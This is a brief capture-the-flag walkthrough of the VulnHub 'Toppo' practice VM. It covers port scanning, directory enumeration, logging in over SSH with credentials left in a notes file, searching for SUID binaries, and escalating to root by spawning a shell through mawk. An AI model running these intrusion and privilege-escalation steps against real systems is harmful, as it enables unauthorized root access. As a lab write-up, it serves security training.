# VulnHub Walkthrough: 🔝 Toppo

Running `nmap -p0-65535 <ipaddr>` tells us *ssh & http* are open.

1. Run a *dirb* scan while you're looking through the source code of the website (http://[IP Address]): `dirb http://<ipaddr>`

2. Dirb returns http://[IP Address]/*admin*. Taking a deeper look at the source code of this page, we find *notes.txt* containing:
     * username: ***ted*** &  password: ***12345ted123***

3. From there we can use the secure shell host protocol, 22, to login - `ssh ted@<ipaddr>` , enter "yes" & password.

4. Once you're in, use `pwd` to "**p**rint **w**orking **d**irectory", & `whoami` to output the user you are logged in as.

5. Next find a list of all programs the logged in user has permissions to:
     * `find / -perm -u=s -type f 2>/dev/null`

6. Within the output we see that *mawk* is available, which we will then use to spawn in sh shell (see [GTFOBins](https://gtfobins.github.io/gtfobins/mawk/#sudo)):
     * `mawk 'BEGIN {system("/bin/sh")}'`

7. Once it has spawned, find & print the flag:
     * `cd root; cat flag.txt`
